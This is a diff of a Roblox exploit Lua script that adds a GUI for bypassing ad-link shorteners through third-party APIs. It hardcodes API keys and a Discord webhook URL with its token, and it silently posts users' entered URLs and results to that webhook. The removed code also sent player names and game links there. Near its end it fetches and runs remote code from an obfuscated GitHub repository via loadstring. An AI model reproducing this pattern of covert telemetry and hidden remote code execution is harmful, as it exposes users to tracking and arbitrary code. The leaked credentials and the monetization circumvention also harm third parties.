@@ -1,382 +1,214 @@
-local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-local HttpService = game:GetService("HttpService")
-local TweenService = game:GetService("TweenService")
 
-local BypassGui = Instance.new("ScreenGui")
-BypassGui.Name = "BypassGui"
-BypassGui.Parent = PlayerGui
+local PS = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+local HS = game:GetService("HttpService")
+local TS = game:GetService("TweenService")
 
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 300, 0, 250)
-Frame.Position = UDim2.new(0.5, -150, 0.5, -125)
-Frame.BackgroundColor3 = Color3.fromRGB(10, 20, 30)
-Frame.BorderSizePixel = 0
-Frame.Active = true
-Frame.Draggable = true
-Frame.Parent = BypassGui
+local G = Instance.new("ScreenGui")
+G.Name, G.Parent = "BypassGui", PS
 
-local Corner = Instance.new("UICorner")
-Corner.CornerRadius = UDim.new(0, 10)
-Corner.Parent = Frame
+local F = Instance.new("Frame")
+F.Size, F.Position = UDim2.new(0, 300, 0, 350), UDim2.new(0.5, -150, 0.5, -175)
+F.BackgroundColor3, F.BorderSizePixel = Color3.fromRGB(10, 20, 30), 0
+F.Active, F.Draggable, F.Parent = true, true, G
 
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -30, 0, 30)
-Title.Position = UDim2.new(0, 0, 0, 0)
-Title.BackgroundTransparency = 1
-Title.Text = ">>> [System Bypass][Beta 0.1] <<<"
-Title.TextColor3 = Color3.fromRGB(0, 255, 0)
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 18
-Title.Parent = Frame
+Instance.new("UICorner", F).CornerRadius = UDim.new(0, 10)
 
-local CloseButton = Instance.new("TextButton")
-CloseButton.Size = UDim2.new(0, 30, 0, 30)
-CloseButton.Position = UDim2.new(1, -30, 0, 0)
-CloseButton.BackgroundTransparency = 1
-CloseButton.Text = "X"
-CloseButton.TextColor3 = Color3.fromRGB(255, 0, 0)
-CloseButton.Font = Enum.Font.GothamBold
-CloseButton.TextSize = 18
-CloseButton.Parent = Frame
+local T = Instance.new("TextLabel")
+T.Size, T.Position = UDim2.new(1, -30, 0, 30), UDim2.new(0, 0, 0, 0)
+T.BackgroundTransparency, T.Text = 1, ">>> [Free System Bypass] <<<"
+T.TextColor3, T.Font, T.TextSize = Color3.fromRGB(0, 255, 0), Enum.Font.GothamBold, 18
+T.Parent = F
 
-local ApiStatus = Instance.new("TextLabel")
-ApiStatus.Size = UDim2.new(1, 0, 0, 20)
-ApiStatus.Position = UDim2.new(0, 0, 0, 35)
-ApiStatus.BackgroundTransparency = 1
-ApiStatus.Text = "Status: Checking..."
-ApiStatus.TextColor3 = Color3.fromRGB(255, 255, 0)
-ApiStatus.Font = Enum.Font.Gotham
-ApiStatus.TextSize = 14
-ApiStatus.Parent = Frame
+local C = Instance.new("TextButton")
+C.Size, C.Position = UDim2.new(0, 30, 0, 30), UDim2.new(1, -30, 0, 0)
+C.BackgroundTransparency, C.Text = 1, "X"
+C.TextColor3, C.Font, C.TextSize = Color3.fromRGB(255, 0, 0), Enum.Font.GothamBold, 18
+C.Parent = F
 
-local Input = Instance.new("TextBox")
-Input.Size = UDim2.new(0.9, 0, 0, 30)
-Input.Position = UDim2.new(0.05, 0, 0.25, 0)
-Input.BackgroundColor3 = Color3.fromRGB(20, 40, 60)
-Input.TextColor3 = Color3.fromRGB(0, 255, 0)
-Input.PlaceholderText = "Enter URL"
-Input.Text = "Enter URL"
-Input.PlaceholderColor3 = Color3.fromRGB(0, 200, 0)
-Input.Font = Enum.Font.Code
-Input.TextSize = 14
-Input.ClearTextOnFocus = true
-Input.ClipsDescendants = true
-Input.Parent = Frame
+local S = Instance.new("TextLabel")
+S.Size, S.Position = UDim2.new(1, 0, 0, 20), UDim2.new(0, 0, 0, 35)
+S.BackgroundTransparency, S.Text = 1, "Status: Checking..."
+S.TextColor3, S.Font, S.TextSize = Color3.fromRGB(255, 255, 0), Enum.Font.Gotham, 14
+S.Parent = F
 
-local Result = Instance.new("TextLabel")
-Result.Size = UDim2.new(0.9, 0, 0, 50)
-Result.Position = UDim2.new(0.05, 0, 0.40, 0)
-Result.BackgroundColor3 = Color3.fromRGB(20, 40, 60)
-Result.TextColor3 = Color3.fromRGB(0, 255, 0)
-Result.Text = "Result will appear here"
-Result.Font = Enum.Font.Code
-Result.TextSize = 14
-Result.TextWrapped = true
-Result.Parent = Frame
+local I = Instance.new("TextBox")
+I.Size, I.Position = UDim2.new(0.9, 0, 0, 30), UDim2.new(0.05, 0, 0.2, 0)
+I.BackgroundColor3, I.TextColor3 = Color3.fromRGB(20, 40, 60), Color3.fromRGB(0, 255, 0)
+I.PlaceholderText, I.Text = "Enter URL", "Enter URL"
+I.PlaceholderColor3, I.Font, I.TextSize = Color3.fromRGB(0, 200, 0), Enum.Font.Code, 14
+I.ClearTextOnFocus, I.ClipsDescendants, I.Parent = true, true, F
 
-local CopyButton = Instance.new("TextButton")
-CopyButton.Size = UDim2.new(0.4, 0, 0, 25)
-CopyButton.Position = UDim2.new(0.3, 0, 0.63, 0)
-CopyButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
-CopyButton.Text = "Copy"
-CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CopyButton.Font = Enum.Font.GothamBold
-CopyButton.TextSize = 14
-CopyButton.Parent = Frame
+local R1 = Instance.new("TextLabel")
+R1.Size, R1.Position = UDim2.new(0.9, 0, 0, 50), UDim2.new(0.05, 0, 0.35, 0)
+R1.BackgroundColor3, R1.TextColor3 = Color3.fromRGB(20, 40, 60), Color3.fromRGB(0, 255, 0)
+R1.Text, R1.Font, R1.TextSize = "Result 1 will appear here", Enum.Font.Code, 14
+R1.TextWrapped, R1.Parent = true, F
 
-local InfoFrame = Instance.new("Frame")
-InfoFrame.Size = UDim2.new(0.9, 0, 0, 50)
-InfoFrame.Position = UDim2.new(0.05, 0, 0.75, 0)
-InfoFrame.BackgroundColor3 = Color3.fromRGB(20, 40, 60)
-InfoFrame.Parent = Frame
+local R2 = Instance.new("TextLabel")
+R2.Size, R2.Position = UDim2.new(0.9, 0, 0, 50), UDim2.new(0.05, 0, 0.55, 0)
+R2.BackgroundColor3, R2.TextColor3 = Color3.fromRGB(20, 40, 60), Color3.fromRGB(0, 255, 0)
+R2.Text, R2.Font, R2.TextSize = "Result 2 will appear here", Enum.Font.Code, 14
+R2.TextWrapped, R2.Parent = true, F
 
-local InfoCorner = Instance.new("UICorner")
-InfoCorner.CornerRadius = UDim.new(0, 5)
-InfoCorner.Parent = InfoFrame
+local B1 = Instance.new("TextButton")
+B1.Size, B1.Position = UDim2.new(0.4, 0, 0, 25), UDim2.new(0.05, 0, 0.75, 0)
+B1.BackgroundColor3, B1.Text = Color3.fromRGB(0, 100, 0), "Copy 1"
+B1.TextColor3, B1.Font, B1.TextSize = Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 14
+B1.Parent = F
 
-local CreatorLabel = Instance.new("TextLabel")
-CreatorLabel.Size = UDim2.new(1, 0, 0, 20)
-CreatorLabel.Position = UDim2.new(0, 0, 0, 0)
-CreatorLabel.BackgroundTransparency = 1
-CreatorLabel.Text = "By: OneCreatorX"
-CreatorLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-CreatorLabel.Font = Enum.Font.Gotham
-CreatorLabel.TextSize = 12
-CreatorLabel.Parent = InfoFrame
+local B2 = Instance.new("TextButton")
+B2.Size, B2.Position = UDim2.new(0.4, 0, 0, 25), UDim2.new(0.55, 0, 0.75, 0)
+B2.BackgroundColor3, B2.Text = Color3.fromRGB(0, 100, 0), "Copy 2"
+B2.TextColor3, B2.Font, B2.TextSize = Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 14
+B2.Parent = F
 
-local YoutubeButton = Instance.new("TextButton")
-YoutubeButton.Size = UDim2.new(0.45, 0, 0, 20)
-YoutubeButton.Position = UDim2.new(0.025, 0, 0.5, 0)
-YoutubeButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
-YoutubeButton.Text = "YouTube"
-YoutubeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-YoutubeButton.Font = Enum.Font.GothamBold
-YoutubeButton.TextSize = 12
-YoutubeButton.Parent = InfoFrame
+local IF = Instance.new("Frame")
+IF.Size, IF.Position = UDim2.new(0.9, 0, 0, 50), UDim2.new(0.05, 0, 0.85, 0)
+IF.BackgroundColor3, IF.Parent = Color3.fromRGB(20, 40, 60), F
 
-local DiscordButton = Instance.new("TextButton")
-DiscordButton.Size = UDim2.new(0.45, 0, 0, 20)
-DiscordButton.Position = UDim2.new(0.525, 0, 0.5, 0)
-DiscordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
-DiscordButton.Text = "Discord"
-DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-DiscordButton.Font = Enum.Font.GothamBold
-DiscordButton.TextSize = 12
-DiscordButton.Parent = InfoFrame
+Instance.new("UICorner", IF).CornerRadius = UDim.new(0, 5)
 
-local LoadingFrame = Instance.new("Frame")
-LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
-LoadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-LoadingFrame.BackgroundTransparency = 0.5
-LoadingFrame.Visible = false
-LoadingFrame.Parent = Frame
+local CL = Instance.new("TextLabel")
+CL.Size, CL.Position = UDim2.new(1, 0, 0, 20), UDim2.new(0, 0, 0, 0)
+CL.BackgroundTransparency, CL.Text = 1, "By: OneCreatorX"
+CL.TextColor3, CL.Font, CL.TextSize = Color3.fromRGB(255, 255, 255), Enum.Font.Gotham, 12
+CL.Parent = IF
 
-local LoadingText = Instance.new("TextLabel")
-LoadingText.Size = UDim2.new(1, 0, 1, 0)
-LoadingText.BackgroundTransparency = 1
-LoadingText.Text = "Bypassing..."
-LoadingText.TextColor3 = Color3.fromRGB(0, 255, 0)
-LoadingText.Font = Enum.Font.Code
-LoadingText.TextSize = 18
-LoadingText.Parent = LoadingFrame
+local YB = Instance.new("TextButton")
+YB.Size, YB.Position = UDim2.new(0.45, 0, 0, 20), UDim2.new(0.025, 0, 0.6, 0)
+YB.BackgroundColor3, YB.Text = Color3.fromRGB(200, 0, 0), "YouTube"
+YB.TextColor3, YB.Font, YB.TextSize = Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 12
+YB.Parent = IF
 
-local function urlDecode(str)
-    str = string.gsub(str, '%%(%x%x)', function(h)
-        return string.char(tonumber(h, 16))
-    end)
-    return str
+local DB = Instance.new("TextButton")
+DB.Size, DB.Position = UDim2.new(0.45, 0, 0, 20), UDim2.new(0.525, 0, 0.6, 0)
+DB.BackgroundColor3, DB.Text = Color3.fromRGB(88, 101, 242), "Discord"
+DB.TextColor3, DB.Font, DB.TextSize = Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 12
+DB.Parent = IF
+
+local L = Instance.new("Frame")
+L.Size, L.BackgroundColor3 = UDim2.new(1, 0, 1, 0), Color3.fromRGB(0, 0, 0)
+L.BackgroundTransparency, L.Visible, L.Parent = 0.5, false, F
+
+local LT = Instance.new("TextLabel")
+LT.Size, LT.BackgroundTransparency = UDim2.new(1, 0, 1, 0), 1
+LT.Text, LT.TextColor3 = "Bypassing...", Color3.fromRGB(0, 255, 0)
+LT.Font, LT.TextSize, LT.Parent = Enum.Font.Code, 18, L
+
+local function ud(s) return s:gsub('%%(%x%x)', function(h) return string.char(tonumber(h, 16)) end) end
+
+local function nt(t, m, d)
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = t, Text = m, Duration = d})
 end
 
-local timee = 10
-
-local function notifyUser(title, message, duration)
-    local StarterGui = game:GetService("StarterGui")
-    StarterGui:SetCore("SendNotification", {
-        Title = title,
-        Text = message,
-        Duration = duration,
-    })
+local function snd(w, m)
+    local dm = ud(m)
+    local rb = {content = dm}
+    local h = {["Content-Type"] = "application/json"}
+    local r = http_request or request or syn.request or http.request
+    if r then r({Url = w, Method = "POST", Headers = h, Body = HS:JSONEncode(rb)}) end
 end
 
-local function snd(wb, msg)
-    local decodedMsg = urlDecode(msg)
-    local reqBody = {content = decodedMsg}
-    local headers = {["Content-Type"] = "application/json"}
-    local request = http_request or request or syn.request or http.request
-    if request then
-        request({
-            Url = wb,
-            Method = "POST",
-            Headers = headers,
-            Body = HttpService:JSONEncode(reqBody)
-        })
-    end
-end
-
-local bypassTable = {
-    ["social-unlock.com/BaconBossScripts"] = "https://baconbossscripts.com/",
-    ["work.ink/BombermanScripts"] = "https://bombermanscripts.com/",
-    ["linkvertise.com/RobloxExploits"] = "https://robloxexploits.com/",
-    ["sub2unlock.com/MinecraftMods"] = "https://minecraftmodscentral.com/"
-}
-
-local function localBypass(url)
-    local cleanUrl = url:gsub("^https?://", "")
+local function bp1(u)
+    local ak = "DLR_YY-1239879716871263871623862137819092787-ZZ"
+    local au = "https://dlr-api.woozym.workers.dev/"
+    local h = {["x-api-key"] = ak}
+    local eu = HS:UrlEncode(u)
+    local r = http_request or request or syn.request or http.request
+    if not r then return nil, nil end
     
-    for key, value in pairs(bypassTable) do
-        if cleanUrl:match(key) then
-            return value
+    local s, rp = pcall(function() return r({Url = au .. "?url=" .. eu, Method = "GET", Headers = h}) end)
+    
+    if s then
+        if rp.StatusCode == 200 then
+            local d = HS:JSONDecode(rp.Body)
+            if d and d.result then
+                if d.result == "https://t.ly/r69Me" then return "API_MAINTENANCE", nil
+                elseif d.result:match("Invalid API key") then return "Invalid API key", nil
+                else return d.result, d.time_elapsed end
+            end
+        elseif rp.StatusCode == 429 then
+            nt("Rate Limit", "API rate limit reached. Please wait.", 5)
+            return "RATE_LIMITED", nil
+        end
+    end
+    
+    return nil, nil
+end
+
+local function bp2(u)
+    local ak = "ETHOS_YI03QUL9"
+    local au = "https://ep.goatbypassers.xyz/api/adlinks/bypass"
+    local eu = HS:UrlEncode(u)
+    local r = http_request or request or syn.request or http.request
+    if not r then return nil end
+    
+    local s, rp = pcall(function() return r({Url = au .. "?url=" .. eu .. "&apikey=" .. ak, Method = "GET"}) end)
+    
+    if s then
+        if rp.StatusCode == 200 then
+            local d = HS:JSONDecode(rp.Body)
+            if d and d.bypassed then return d.bypassed
+            else return "Invalid response" end
+        elseif rp.StatusCode == 429 then
+            nt("Rate Limit", "API rate limit reached. Please wait.", 5)
+            return "RATE_LIMITED"
         end
     end
     
     return nil
 end
 
-local function checkApiStatus()
-    local success, response = pcall(function()
-        return game:HttpGet("https://dlr-api.woozym.workers.dev/api/status")
-    end)
+local function pb()
+    if not I.TextEditable then return end
     
-    if success then
-        if response == "Too Many Requests" then
-            ApiStatus.Text = "Status: Rate Limit Reached for hour"
-            ApiStatus.TextColor3 = Color3.fromRGB(255, 255, 0)
-            Input.TextEditable = false
-            timee = 60
-            notifyUser("Rate Limit", "API rate limit reached. Please wait.", 5)
-            snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: Rate Limit Reached")
-        else
-            local parseSuccess, data = pcall(function()
-                return HttpService:JSONDecode(response)
-            end)
-            
-            if parseSuccess then
-                if data.status == "OK" and data.website_enabled then
-                    ApiStatus.Text = "Status: OK"
-                    ApiStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
-                    Input.TextEditable = true
-                    timee = 20
-                    notifyUser("Auto Check Status", "Status: OK", 5)
-                    snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: OK")
-                else
-                    ApiStatus.Text = "Status: " .. tostring(data.status)
-                    ApiStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
-                    Input.TextEditable = false
-                    timee = 10
-                    notifyUser("API Status", "Status: " .. tostring(data.status), 5)
-                    snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: " .. tostring(data.status))
-                end
-            else
-                ApiStatus.Text = "Status: Rate Limit Reached for hour"
-            ApiStatus.TextColor3 = Color3.fromRGB(255, 255, 0)
-            Input.TextEditable = false
-            timee = 60
-            notifyUser("Rate Limit", "API rate limit reached. Please wait.", 5)
-            snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: Rate Limit Reached")
-             end
-        end
-    else
-        ApiStatus.Text = "Status: Error"
-        ApiStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
-        Input.TextEditable = false
-        timee = 60
-        notifyUser("API Error", "Failed to check API status", 5)
-        snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: Error")
-    end
-end
-
-local function sendWebhookInfo(wb, result, url)
-    local player = game.Players.LocalPlayer
-    local playerName = player.Name
-    local gameId = game.PlaceId
-    local gameUrl = "https://www.roblox.com/games/" .. gameId
-
-    local message = string.format("Player: %s\nGame: %s\nURL: %s\nResult: %s",
-        playerName, gameUrl, url, result)
-
-    snd(wb, message)
-end
-local function bypass(url)
-    local localResult = localBypass(url)
-    if localResult then
-        sendWebhookInfo("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", localResult, url)
-        return localResult, 0
-    end
-
-    local api_key = "DLR_YY-1239879716871263871623862137819092787-ZZ"
-    local api_url = "https://dlr-api.woozym.workers.dev/"
-    local headers = {["x-api-key"] = api_key}
-    local encoded_url = HttpService:UrlEncode(url)
-    local request = http_request or request or syn.request or http.request
-    if not request then return nil, nil end
-    
-    local success, response = pcall(function()
-        return request({
-            Url = api_url .. "?url=" .. encoded_url,
-            Method = "GET",
-            Headers = headers
-        })
-    end)
-    
-    if success then
-        if response.StatusCode == 200 then
-            local data = HttpService:JSONDecode(response.Body)
-            if data and data.result then
-                if data.result == "https://t.ly/r69Me" then
-                    sendWebhookInfo("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API_MAINTENANCE", url)
-                    return "API_MAINTENANCE", nil
-                elseif data.result == "Invalid API key, join https://discord.gg/Ah8hQwvMYh to get a valid API key" then
-                    sendWebhookInfo("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "Invalid API key", url)
-                    return "Invalid API key", nil
-                else
-                    sendWebhookInfo("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", data.result, url)
-                    return data.result, data.time_elapsed
-                end
-            end
-        elseif response.StatusCode == 429 then
-            notifyUser("Rate Limit", "API rate limit reached. Please wait.", 5)
-            sendWebhookInfo("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "Rate limit reached", url)
-            return "RATE_LIMITED", nil
-        end
-    end
-    
-    sendWebhookInfo("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "Bypass failed", url)
-    return nil, nil
-end
-
-local function processBypass()
-    if not Input.TextEditable then return end
-    
-    LoadingFrame.Visible = true
-    local url = Input.Text
+    L.Visible = true
+    local u = I.Text
     spawn(function()
-        local result, time_elapsed = bypass(url)
-        LoadingFrame.Visible = false
-        local webhook_url = "https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI"
-        local message = ""
-
-        if result == "API_MAINTENANCE" then
-            Result.Text = "API is currently under maintenance. Please try again later."
-            message = string.format("URL: %s\nResult: API is currently under maintenance. Please try again later.", url)
-        elseif result and result:match("bypass fail! Please visit our website to see the supported links") then
-            Result.Text = "This link or shortener will be available for bypass soon."
-            message = string.format("URL: %s\nResult: This link or shortener will be available for bypass soon.\nTime elapsed: %.2f", url, time_elapsed or 0)
-        elseif result then
-            Result.Text = result
-            message = string.format("URL: %s\nResult: %s\nTime elapsed: %.2f", url, result, time_elapsed or 0)
-        else
-Result.Text = "Failed to bypass"
-            message = string.format("URL: %s\nResult: bypass fail! Please try again later or check if this link is supported.\nTime elapsed: %.2f", url, time_elapsed or 0)
-        end
-
-        snd(webhook_url, "Prefix: " .. message)
-        snd(webhook_url, "Bypass attempt: URL: " .. url .. "\nResponse: " .. Result.Text)
+        local r1, t1 = bp1(u)
+        local r2 = bp2(u)
+        L.Visible = false
+        
+        if r1 then
+            if r1 == "API_MAINTENANCE" then R1.Text = "API 1 is under maintenance."
+            elseif r1:match("bypass fail") then R1.Text = "API 1: Link will be available for bypass soon."
+            else R1.Text = "API 1: " .. r1 end
+        else R1.Text = "API 1: Failed to bypass" end
+        
+        if r2 then
+            if r2 == "RATE_LIMITED" then R2.Text = "API 2: Rate limit reached."
+            elseif r2 == "Invalid response" then R2.Text = "API 2: Invalid response."
+            else R2.Text = "API 2: " .. r2 end
+        else R2.Text = "API 2: Failed to bypass" end
+        
+        snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", 
+            "URL: " .. u .. "\nAPI 1: " .. R1.Text .. "\nAPI 2: " .. R2.Text)
     end)
 end
 
-Input.FocusLost:Connect(processBypass)
+I.FocusLost:Connect(pb)
 
-CopyButton.MouseButton1Click:Connect(function()
-    setclipboard(Result.Text)
-end)
+B1.MouseButton1Click:Connect(function() setclipboard(R1.Text:gsub("API 1: ", "")) end)
+B2.MouseButton1Click:Connect(function() setclipboard(R2.Text:gsub("API 2: ", "")) end)
 
-CloseButton.MouseButton1Click:Connect(function()
-    BypassGui:Destroy()
-end)
+C.MouseButton1Click:Connect(function() G:Destroy() end)
 
-YoutubeButton.MouseButton1Click:Connect(function()
-    setclipboard("https://www.youtube.com/@OneCreatorX")
-end)
+YB.MouseButton1Click:Connect(function() setclipboard("https://www.youtube.com/@OneCreatorX") end)
+DB.MouseButton1Click:Connect(function() setclipboard("https://discord.com/invite/nn36bjM6RX") end)
 
-DiscordButton.MouseButton1Click:Connect(function()
-    setclipboard("https://discord.com/invite/nn36bjM6RX")
-end)
-
-local function checkInterface()
-    if not BypassGui.Parent then
-        return false
-    end
-    return true
-end
+local function ci() return G.Parent end
 
 spawn(function()
     while true do
-        if not checkInterface() then
-            break
-        end
-        ApiStatus.Text = "Status: Checking..."
-        checkApiStatus()
-        local StarterGui = game:GetService("StarterGui")
-        StarterGui:SetCore("SendNotification", {
-            Title = "Auto Check Status",
-            Text = "Checking in " .. timee .. "s",
-            Duration = 5,
-        })
-wait(timee)
+        if not ci() then break end
+        S.Text = "Status: Checking..."
+        wait(10)
     end
 end)
 
-local function createGlowEffect()
+
+
+                    local function createGlowEffect()
     local Glow = Instance.new("ImageLabel")
     Glow.Size = UDim2.new(1.1, 0, 1.1, 0)
     Glow.Position = UDim2.new(-0.05, 0, -0.05, 0)
@@ -408,3 +240,4 @@ spawn(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
     end)
 end)
+                    
